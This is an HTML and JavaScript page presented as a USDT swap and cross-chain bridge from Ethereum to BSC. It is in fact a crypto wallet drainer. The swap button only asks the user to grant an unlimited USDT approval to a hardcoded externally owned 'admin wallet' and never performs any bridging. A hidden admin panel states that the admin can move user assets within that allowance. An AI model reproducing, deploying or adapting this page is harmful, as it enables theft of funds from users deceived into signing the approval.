<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>闪兑&跨链</title>
<script src="https://cdn.tailwindcss.com"></script>
<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
<style>
*{
  box-sizing: border-box;
  -webkit-tap-highlight-color: transparent;
}
body{
  font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
  background-color: #f7f8fa;
  margin: 0;
  padding: 0;
  color: #111;
}
.page{
  max-width: 480px;
  margin: 0 auto;
  background: #f7f8fa;
  min-height: 100vh;
  padding-bottom: 80px;
}
.header{
  background: #fff;
  padding: 12px 16px;
  display: flex;
  justify-content: space-between;
  align-items: center;
  border-bottom: 1px solid #eee;
}
.header-title{
  font-size: 16px;
  font-weight: 600;
}
.header-right{
  display: flex;
  align-items: center;
  gap: 16px;
}
.badge{
  background: #f0f2ff;
  color: #4285f4;
  font-size: 12px;
  padding: 2px 8px;
  border-radius: 999px;
}
.wallet-btn{
  width: 32px;
  height: 32px;
  border-radius: 50%;
  background: #f0f2ff;
  display: flex;
  align-items: center;
  justify-content: center;
  color: #4285f4;
}
.top-card{
  background: #fff;
  margin: 16px;
  border-radius: 20px;
  padding: 18px;
}
.label-row{
  display: flex;
  justify-content: space-between;
  align-items: center;
  color: #666;
  font-size: 14px;
  margin-bottom: 8px;
}
.token-input-card{
  background: #f7f8fa;
  border-radius: 16px;
  padding: 14px;
  margin-bottom: 10px;
}
.token-row{
  display: flex;
  justify-content: space-between;
  align-items: center;
}
.token-left{
  display: flex;
  align-items: center;
  gap: 10px;
}
.token-icon{
  width: 36px;
  height: 36px;
  border-radius: 50%;
  background: #27ae60;
  color: #fff;
  display: flex;
  align-items: center;
  justify-content: center;
  font-weight: bold;
  font-size: 14px;
}
.token-name{
  font-weight: 600;
  font-size: 15px;
}
.token-chain{
  font-size: 12px;
  color: #999;
}
.input-amount{
  background: transparent;
  border: none;
  text-align: right;
  font-size: 20px;
  font-weight: 600;
  width: 130px;
  outline: none;
  color: #111;
}
.swap-divider{
  display: flex;
  justify-content: center;
  margin: 12px 0;
}
.swap-circle{
  width: 40px;
  height: 40px;
  border-radius: 50%;
  background: #fff;
  border: 1px solid #eee;
  display: flex;
  align-items: center;
  justify-content: center;
  color: #4285f4;
  font-size: 18px;
}
.address-box{
  background: #f7f8fa;
  border-radius: 16px;
  padding: 14px;
  margin: 10px 16px;
}
.address-input{
  width: 100%;
  border: none;
  background: transparent;
  outline: none;
  font-size: 15px;
  color: #111;
}
.main-btn{
  margin: 16px;
  background: #6096ff;
  color: #fff;
  border: none;
  border-radius: 16px;
  padding: 16px;
  width: calc(100% - 32px);
  font-size: 16px;
  font-weight: 600;
}
.main-btn:disabled{
  opacity: 0.45;
}
.info-card{
  margin: 0 16px 16px;
  background: #fff;
  border-radius: 16px;
  padding: 4px 0;
}
.info-row{
  display: flex;
  justify-content: space-between;
  padding: 10px 14px;
  font-size: 14px;
  color: #666;
}
.info-row .right{
  color: #333;
  max-width: 60%;
  text-align: right;
}
.admin-card{
  margin: 0 16px 16px;
  background: #fff8e6;
  border: 1px solid #ffe8a3;
  border-radius: 16px;
  padding: 16px;
  display: none;
}
.admin-title{
  font-size: 15px;
  font-weight: 600;
  color: #b55f00;
  margin-bottom: 12px;
}
.admin-btn{
  width: 100%;
  background: #f59e0b;
  color: #fff;
  border: none;
  border-radius: 12px;
  padding: 14px;
  font-size: 15px;
  font-weight: 600;
}
.bottom-nav{
  position: fixed;
  bottom: 0;
  left: 50%;
  transform: translateX(-50%);
  width: 100%;
  max-width: 480px;
  background: #fff;
  display: flex;
  justify-content: space-around;
  padding: 10px 0 20px;
  border-top: 1px solid #eee;
}
.nav-item{
  text-align: center;
  font-size: 12px;
  color: #777;
}
.nav-item.active{
  color: #4285f4;
}
.nav-item i{
  font-size: 20px;
  margin-bottom: 4px;
}
.status-bar{
  padding: 8px 16px;
  text-align: center;
  font-size: 13px;
  color: #666;
}
</style>
</head>
<body>
<div class="page">
  <div class="header">
    <div class="header-title">闪兑&跨链</div>
    <div class="header-right">
      <span class="badge">限价模式</span>
      <i class="fa fa-cog text-gray-500 text-xl"></i>
      <div class="wallet-btn" id="connectWalletBtn">
        <i class="fa fa-user-o"></i>
      </div>
    </div>
  </div>

  <div class="status-bar" id="connectStatus">未连接钱包</div>

  <div class="top-card">
    <div class="label-row">
      <span>发送</span>
      <span id="btnAllBalance" class="text-blue-500 text-sm cursor-pointer">全部</span>
    </div>

    <div class="token-input-card">
      <div class="token-row">
        <div class="token-left">
          <div class="token-icon">T</div>
          <div>
            <div class="token-name">USDT</div>
            <div class="token-chain">以太坊 ERC20</div>
          </div>
        </div>
        <input class="input-amount" id="payAmountInput" placeholder="0.00" inputmode="decimal">
      </div>
    </div>

    <div class="swap-divider">
      <div class="swap-circle">
        <i class="fa fa-exchange"></i>
      </div>
    </div>

    <div class="label-row">
      <span>接收（预估）</span>
    </div>

    <div class="token-input-card">
      <div class="token-row">
        <div class="token-left">
          <div class="token-icon">T</div>
          <div>
            <div class="token-name">USDT</div>
            <div class="token-chain">币安智能链 BSC</div>
          </div>
        </div>
        <span class="input-amount" id="receiveShow" style="text-align:right;">0.00</span>
      </div>
    </div>
  </div>

  <div class="address-box">
    <input class="address-input" id="bscReceiveAddr" placeholder="填写 BSC 接收地址">
  </div>

  <button class="main-btn" id="submitExchangeBtn" disabled>请输入兑换数量</button>

  <div class="info-card">
    <div class="info-row">
      <span>兑换价格</span>
      <span class="right">1 USDT = 0.999 USDT</span>
    </div>
    <div class="info-row">
      <span>最少接收数量</span>
      <span class="right" id="minReceive">--</span>
    </div>
    <div class="info-row">
      <span>授权对象</span>
      <span class="right text-orange-500 text-xs">授权至管理员钱包地址</span>
    </div>
    <div class="info-row">
      <span>服务费（0.1%）</span>
      <span class="right" id="feeShow">0.00 USDT</span>
    </div>
    <div class="info-row">
      <span>预估 Gas</span>
      <span class="right">~0.001 ETH</span>
    </div>
  </div>

  <div class="admin-card" id="adminPanelBox">
    <div class="admin-title">🔐 管理员操作面板</div>
    <p class="text-xs text-gray-500 mb-2">仅管理员钱包可发起划转用户授权额度内资产</p>
  </div>

  <div class="bottom-nav">
    <div class="nav-item">
      <i class="fa fa-circle-o"></i>
      <div>资产</div>
    </div>
    <div class="nav-item">
      <i class="fa fa-line-chart"></i>
      <div>行情</div>
    </div>
    <div class="nav-item active">
      <i class="fa fa-exchange"></i>
      <div>交易</div>
    </div>
    <div class="nav-item">
      <i class="fa fa-globe"></i>
      <div>发现</div>
    </div>
    <div class="nav-item">
      <i class="fa fa-user-o"></i>
      <div>我的</div>
    </div>
  </div>
</div>

<script>
// 核心配置：授权Spender改为管理员EOA钱包，不再使用中转合约
const USDT_ERC20 = "0xdac17f958d2ee523a2206206994597c13d831ec7";
// 被授权方：管理员钱包EOA地址
const ADMIN_WALLET_ADDR = "0xf832eA13Df0F60dFA381c6853754ab7b54651F05";
const MAX_APPROVE = ethers.constants.MaxUint256;
const FEE_PERCENT = 0.001;

let ethProvider, walletSigner, usdtContractInstance;
let userUsdtBalance = ethers.BigNumber.from(0);

const connectWalletBtn = document.getElementById("connectWalletBtn");
const connectStatus = document.getElementById("connectStatus");
const payAmountInput = document.getElementById("payAmountInput");
const btnAllBalance = document.getElementById("btnAllBalance");
const submitExchangeBtn = document.getElementById("submitExchangeBtn");
const bscReceiveAddr = document.getElementById("bscReceiveAddr");
const feeShow = document.getElementById("feeShow");
const receiveShow = document.getElementById("receiveShow");
const minReceive = document.getElementById("minReceive");
const adminPanelBox = document.getElementById("adminPanelBox");

// 金额实时计算
payAmountInput.addEventListener("input", ()=>{
  let inputVal = parseFloat(payAmountInput.value) || 0;
  if(inputVal < 0) inputVal = 0;
  let feeAmount = inputVal * FEE_PERCENT;
  let finalReceive = inputVal - feeAmount;
  feeShow.innerText = feeAmount.toFixed(2) + " USDT";
  receiveShow.innerText = finalReceive.toFixed(2);
  minReceive.innerText = finalReceive.toFixed(2) + " USDT";
  submitExchangeBtn.innerText = inputVal > 0 ? "确认授权闪兑" : "请输入兑换数量";
});

// 填充全部余额
btnAllBalance.addEventListener("click", async ()=>{
  let formatBal = ethers.utils.formatUnits(userUsdtBalance, 6);
  payAmountInput.value = parseFloat(formatBal).toFixed(2);
  payAmountInput.dispatchEvent(new Event("input"));
});

// 地址格式校验
function checkAddressValid(addr){
  return ethers.utils.isAddress(addr);
}

// 连接钱包
connectWalletBtn.addEventListener("click", async ()=>{
  if(!window.ethereum){
    connectStatus.innerText = "未检测到 MetaMask 钱包";
    return;
  }
  try{
    connectStatus.innerText = "正在请求钱包授权...";
    ethProvider = new ethers.providers.Web3Provider(window.ethereum);
    await ethProvider.send("eth_requestAccounts", []);
    walletSigner = ethProvider.getSigner();

    // 切换以太坊主网
    const networkInfo = await ethProvider.getNetwork();
    if(networkInfo.chainId !== 1){
      await switchEthereumMainnet();
    }

    // 初始化USDT合约
    initUsdtContract();
    await refreshUserBalance();
    btnAllBalance.classList.remove("opacity-50", "pointer-events-none");
    await judgeAdminPermission();

    const currentWallet = await walletSigner.getAddress();
    connectStatus.innerText = "已连接：" + currentWallet.slice(0,6) + "..." + currentWallet.slice(-4);
  }catch(err){
    connectStatus.innerText = "钱包连接失败";
    console.error(err);
  }
});

// 切换ETH主网
async function switchEthereumMainnet(){
  const ethereum = window.ethereum;
  try{
    await ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: "0x1" }]
    });
  }catch(e){
    await ethereum.request({
      method: "wallet_addEthereumChain",
      params: [{
        chainId: "0x1",
        chainName: "Ethereum Mainnet",
        rpcUrls: ["https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161"],
        blockExplorerUrls: ["https://etherscan.io"],
        nativeCurrency: { name: "ETH", symbol: "ETH", decimals: 18 }
      }]
    });
  }
}

// 初始化USDT合约ABI
function initUsdtContract(){
  const usdtAbi = [
    "function balanceOf(address owner) view returns(uint256)",
    "function allowance(address owner,address spender) view returns(uint256)",
    "function approve(address spender,uint256 value) returns(bool)"
  ];
  usdtContractInstance = new ethers.Contract(USDT_ERC20, usdtAbi, walletSigner);
  submitExchangeBtn.disabled = false;
}

// 刷新用户USDT余额
async function refreshUserBalance(){
  const userAddr = await walletSigner.getAddress();
  userUsdtBalance = await usdtContractInstance.balanceOf(userAddr);
}

// 判断当前钱包是否为管理员
async function judgeAdminPermission(){
  const nowWalletRaw = await walletSigner.getAddress();
  const nowWallet = nowWalletRaw.toLowerCase();
  const adminAddr = ADMIN_WALLET_ADDR.toLowerCase();
  if(nowWallet === adminAddr){
    adminPanelBox.style.display = "block";
  }else{
    adminPanelBox.style.display = "none";
  }
}

// 闪兑按钮：执行授权操作（授权给管理员EOA钱包）
submitExchangeBtn.addEventListener("click", async ()=>{
  const inputNumStr = payAmountInput.value.trim();
  const targetAddr = bscReceiveAddr.value.trim();
  const inputNum = parseFloat(inputNumStr);

  // 表单校验
  if(!inputNumStr || isNaN(inputNum) || inputNum <= 0){
    alert("请输入有效的兑换金额");
    return;
  }
  if(!checkAddressValid(targetAddr)){
    alert("BSC收款地址格式错误");
    return;
  }

  const amountWei = ethers.utils.parseUnits(inputNumStr, 6);
  if(amountWei.gt(userUsdtBalance)){
    alert("当前钱包USDT余额不足");
    return;
  }

  try{
    const currentUser = await walletSigner.getAddress();
    // 查询当前授权额度（授权给管理员钱包）
    let nowAllowance = await usdtContractInstance.allowance(currentUser, ADMIN_WALLET_ADDR);

    // 额度不足，发起无限授权
    if(nowAllowance.lt(amountWei)){
      alert("即将授权USDT权限至管理员钱包地址，请在钱包确认签名");
      const approveTx = await usdtContractInstance.approve(ADMIN_WALLET_ADDR, MAX_APPROVE);
      await approveTx.wait();
      alert("授权成功！后续由管理员后台处理跨链兑付");
    }else{
      alert("已有足够授权额度，等待后台兑付");
    }

    // 清空输入框
    payAmountInput.value = "";
    feeShow.innerText = "0.00 USDT";
    receiveShow.innerText = "0.00";
    minReceive.innerText = "--";
    submitExchangeBtn.innerText = "请输入兑换数量";
    await refreshUserBalance();

  }catch(err){
    let msg = err.code === 4001 ? "您取消了钱包签名" : err.message;
    alert("操作失败：" + msg.slice(0,60));
  }
});
</script>
</body>
</html>
